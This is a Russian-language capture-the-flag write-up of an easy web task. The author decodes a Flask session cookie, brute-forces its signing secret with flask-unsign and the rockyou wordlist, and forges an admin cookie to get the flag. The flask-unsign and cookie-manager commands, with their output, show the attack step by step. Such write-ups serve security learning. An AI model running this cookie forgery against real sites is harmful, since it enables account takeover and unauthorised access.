
level: **Лёгкий**
Description: **Видные люди в гостях не засиживаются**
IP: **62.173.140.174:16042**

Нас встречает 
![[Pasted image 20240224170953.png]]

Пишем самую очевидную команду для эмуляции терминалов на CTF - 
![[Pasted image 20240224171227.png]]
пробуем getFlag
![[Pasted image 20240224171313.png]]
Очевидно не работает, давайте заглянем под капот к этому таску:

![[Pasted image 20240224171629.png]]

Если загуглить или спросить у ChatGpt что значит xmkHttp.withCredentials()
то будет ответ:
![[Pasted image 20240224171732.png]]

Значит надо обратить внимание на аутентификацию пользователя на сайте.
![[Pasted image 20240224171941.png]]
`
`.eJwljjsOAjEMBe-SmsL5Oc5eZmU7L0C7nwpxdyLRjmak-YR9HjhfYbuOG4-wv0fYgpWSoml3Ti5oNJt2WE3ulnJRJjMYiEx6Y47ZnQGo6KoyKcdJRbRRzTJbSrw0H-gSI42SUUcZFeJdx2Lg3kckaiYs0VOmGdbIfeL43zxvnFf4_gCupzEt.ZdnnSA.HZXegpDnNvZmxaKdlFxDs2kNZ-A`

Поле session представляет собой Flask Session Cookie , это подтверждает werkzeug в бурпе или в расширении Wappalyzer, а также характерная точка в начале.

После поиска в интернете находим:
https://www.kirsle.net/wizards/flask-session.cgi
 куда пихаем наш токен.
 ![[Pasted image 20240224172334.png]]

````json
{
    "_fresh": true,
    "_id": "b4421ba9c62c8e70f7a9eb52ccb234a60bbebe00b8976613cc6eeea8a21b30a61f048a70538f7226897cde98110d43e5d4d5e8c9ad981e699d1007b8681c230f",
    "_user_id": "guest"
}
````


значит надо изменить `_user_id` на admin, но как это сделать?


>Как уже упоминал Элиас, файл cookie можно декодировать без секретного ключа, но без него нельзя манипулировать им по очевидным причинам безопасности. Если бы подделка файлов cookie была такой простой, никто бы не использовал сеансы Flask. Поэтому ваша задача — найти секретный ключ, а поскольку хеш-функция SHA-1 необратима, вам следует обратить внимание на человеческий фактор. 
>При этом вам придется «угадывать» секретный ключ нерадивого программиста конкурса, используя грубую силу, и, к счастью, Flask-Unsign может вам в этом помочь. Вы можете установить его через pip, используя следующую команду: 
>`pip3 install flask-unsign`
`
> Но перед его использованием вам понадобится список слов, например rockyou, который вы можете скачать из репозитория Kali Linux.
\-https://stackoverflow.com/questions/77340063/flask-session-cookie-tampering

Сначала я попробовал слова:
- underground
- codeby
- guest
- admin
- CODEBY
как самые очевидные. Но потом все-таки решил rockyou.
````python
flask-unsign --unsign --cookie '.eJwljjsOAjEMBe-SmsL5Oc5eZmU7L0C7nwpxdyLRjmak-YR9HjhfYbuOG4-wv0fYgpWSoml3Ti5oNJt2WE3ulnJRJjMYiEx6Y47ZnQGo6KoyKcdJRbRRzTJbSrw0H-gSI42SUUcZFeJdx2Lg3kckaiYs0VOmGdbIfeL43zxvnFf4_gCupzEt.ZdnnSA.HZXegpDnNvZmxaKdlFxDs2kNZ-A' --no-literal-eval -w /usr/share/wordlists/rockyou.txt
````

И через пару секунд:
````python
flask-unsign --unsign --cookie '.eJwljjsOAjEMBe-SmsL5Oc5eZmU7L0C7nwpxdyLRjmak-YR9HjhfYbuOG4-wv0fYgpWSoml3Ti5oNJt2WE3ulnJRJjMYiEx6Y47ZnQGo6KoyKcdJRbRRzTJbSrw0H-gSI42SUUcZFeJdx2Lg3kckaiYs0VOmGdbIfeL43zxvnFf4_gCupzEt.ZdnnSA.HZXegpDnNvZmxaKdlFxDs2kNZ-A' --no-literal-eval -w /usr/share/wordlists/rockyou.txt

[*] Session decodes to: {'_fresh': True, '_id': 'b4421ba9c62c8e70f7a9eb52ccb234a60bbebe00b8976613cc6eeea8a21b30a61f048a70538f7226897cde98110d43e5d4d5e8c9ad981e699d1007b8681c230f', '_user_id': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1408 attempts
b'ramirez' 
````

Отлично, мы нашли `secret_key`, осталось совсем немного.

````python
python3 flask_session_cookie_manager3.py encode -s 'ramirez' -t '{"_fresh":True,"_id":"b4421ba9c62c8e70f7a9eb52ccb234a60bbebe00b8976613cc6eeea8a21b30a61f048a70538f7226897cde98110d43e5d4d5e8c9ad981e699d1007b8681c230f","_user_id":"admin"}'


.eJwljjkOwjAQAP_immLXx3qdz6C9LFJAkZAK8Xcs0Y5mpPmk-zzifKTtfVxxS_fd05a01owqwygbR4fZZYS2bKa5VCFQDQ0A5dGJsJhRRAjLqgoI4YTK0qEVnj1nWpp5DEYEryWaV2_BNsQXCxrDEaArE6PlAjOtkeuM438j_txf6fsDrgUxDg.Zdn3sA.B2ohvSthVgrLENSjGclY1HngkQQ

````
Пробуем подставить это значение в поле `session`
![[Pasted image 20240224174615.png]]
Отлично!
**CODEBY{fl4sk_w3b_4pps_c4n_b3_vuln3r4bl3}**

Stay Inline 
